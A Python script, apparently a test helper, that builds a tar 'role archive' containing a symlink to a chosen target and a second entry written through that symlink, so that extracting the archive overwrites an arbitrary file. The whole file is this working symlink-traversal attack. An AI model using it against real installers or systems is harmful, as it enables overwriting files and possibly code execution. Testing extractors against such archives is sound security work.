#!/usr/bin/env python
"""Create a role archive which overwrites an arbitrary file."""

import argparse
import pathlib
import tarfile
import tempfile


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('archive', type=pathlib.Path, help='archive to create')
    parser.add_argument('content', type=pathlib.Path, help='content to write')
    parser.add_argument('target', type=pathlib.Path, help='file to overwrite')

    args = parser.parse_args()

    create_archive(args.archive, args.content, args.target)


def create_archive(archive_path: pathlib.Path, content_path: pathlib.Path, target_path: pathlib.Path) -> None:
    with (
        tarfile.open(name=archive_path, mode='w') as role_archive,
        tempfile.TemporaryDirectory() as temp_dir_name,
    ):
        temp_dir_path = pathlib.Path(temp_dir_name)

        meta_main_path = temp_dir_path / 'meta' / 'main.yml'
        meta_main_path.parent.mkdir()
        meta_main_path.write_text('')

        symlink_path = temp_dir_path / 'symlink'
        symlink_path.symlink_to(target_path)

        role_archive.add(meta_main_path)
        role_archive.add(symlink_path)

        content_tarinfo = role_archive.gettarinfo(content_path, str(symlink_path))

        with content_path.open('rb') as content_file:
            role_archive.addfile(content_tarinfo, content_file)


if __name__ == '__main__':
    main()
